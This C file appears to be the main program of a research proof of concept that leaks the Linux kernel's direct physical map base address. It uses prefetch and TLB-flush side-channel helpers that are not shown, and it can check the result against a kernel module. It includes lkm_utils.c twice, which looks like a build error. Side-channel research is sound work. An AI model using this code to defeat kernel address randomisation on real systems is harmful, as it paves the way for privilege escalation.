#define _GNU_SOURCE
#include <sys/ioctl.h>

#include <fcntl.h>
#include <stddef.h>

#define VALIDATE
#ifdef VALIDATE
#include "lkm_utils.c"
#endif

#include "lkm_utils.c"
#include "prefetch.c"
#include "tlbflush.c"

#define DPM_LEAK_TRIES 100

int
main(void)
{
	init_tlb_flush();
	pin_to_core(0);

	for (volatile size_t i = 0; i < (1ULL << 30); ++i)
		;
	size_t dpm_base = dpm_leak(DPM_LEAK_TRIES);
	printf("%lx\n", dpm_base);

#ifdef VALIDATE
	lkm_open();
	if (lkm_get_dpm_base() == dpm_base) {
		printf("[+] success\n");
	} else {
		printf("[!] fail\n");
	}
#endif
}
